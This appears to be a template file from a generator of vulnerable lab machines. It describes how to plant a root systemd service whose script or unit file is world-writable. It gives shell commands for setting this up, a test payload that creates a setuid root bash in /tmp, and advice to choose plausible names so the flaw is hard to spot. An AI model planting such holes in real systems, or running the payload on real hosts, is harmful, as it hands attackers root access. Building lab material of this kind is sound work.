---
id: writable_systemd_service
description: Creates a systemd service unit file or its ExecStart script with world-writable permissions, allowing a low-privilege user to modify it and execute arbitrary code as root on service restart.
required_vars: [service_name, exec_path]
---
# Atom: Writable Systemd Service
A systemd service runs as root, but either its unit file or the script it executes is world-writable. When the service is restarted (e.g. after a reboot or manual restart), the attacker's injected code runs as root.

### Logic Requirements:
1. Create the `ExecStart` script at `<exec_path>` with benign default content.
2. Set world-writable permissions on the script: `chmod 777 <exec_path>` or `chown <username>:<username> <exec_path>`
3. Create the systemd unit file at `/etc/systemd/system/<service_name>.service`
4. Enable and start the service: `systemctl daemon-reload && systemctl enable <service_name> && systemctl start <service_name>`

### Common Patterns:
- **Writable ExecStart Script:**
  ```bash
  cat > /opt/monitor.sh << 'EOF'
  #!/bin/bash
  echo "$(date): system ok" >> /var/log/monitor.log
  EOF
  chmod 777 /opt/monitor.sh

  cat > /etc/systemd/system/monitor.service << 'EOF'
  [Unit]
  Description=System Monitor

  [Service]
  Type=simple
  ExecStart=/opt/monitor.sh
  Restart=always

  [Install]
  WantedBy=multi-user.target
  EOF

  systemctl daemon-reload
  systemctl enable monitor
  systemctl start monitor
  ```
- **Writable Unit File Itself:**
  ```bash
  chmod 666 /etc/systemd/system/<service_name>.service
  # Attacker modifies ExecStart= line directly in the unit file
  ```

### Testing Guidance:
1. Verify the service is running: `systemctl status <service_name>`
2. Verify the script permissions: `ls -l <exec_path>` — should be world-writable.
3. As a low-priv user, overwrite the script with a payload:
   `echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > <exec_path>`
4. Restart the service: `systemctl restart <service_name>`
5. Verify privilege escalation: `ls -l /tmp/rootbash` and `/tmp/rootbash -p -c 'id'`

### Synthesis Guidance:
Choose a `service_name` and `exec_path` that sound like a plausible background task (e.g. `monitor`, `backup`, `health-check`). Prefer making the `ExecStart` script world-writable over the unit file itself, as it is more realistic and harder to detect at a glance. The Builder should ensure `systemctl` is available and that systemd is the init system (standard in modern Debian/Ubuntu Docker images with `--privileged` or appropriate capabilities).
